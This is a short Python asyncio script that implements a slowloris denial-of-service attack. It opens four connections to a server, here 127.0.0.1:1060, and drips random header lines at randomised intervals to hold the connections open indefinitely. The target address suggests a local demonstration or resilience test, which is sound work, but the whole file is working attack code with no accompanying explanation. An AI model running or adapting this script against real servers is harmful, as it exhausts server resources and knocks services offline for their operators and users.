import asyncio
from functools import partial
import random
from typing import Callable, Generator


async def headers(
    random_sleep: Callable[[], float] = lambda: 1
) -> Generator[bytes, None, None]:
    yield 'TOP HEADER\r\n'.encode('ascii')
    while True:
        await asyncio.sleep(random_sleep())
        yield random.randbytes(8) + '\r\n'.encode('ascii')


async def slow_loris(address, random_sleep):
    _, server = await asyncio.open_connection(*address)
    async for header in headers(random_sleep):
        server.write(header)
        await server.drain()


async def main(address):
    lorises = [
        asyncio.create_task(
            slow_loris(address, partial(random.gauss, mu=1, sigma=0.5))
        )
        for _ in range(4)
    ]
    await asyncio.gather(*lorises)


if __name__ == '__main__':
    address = ('127.0.0.1', 1060)
    asyncio.run(main(address))
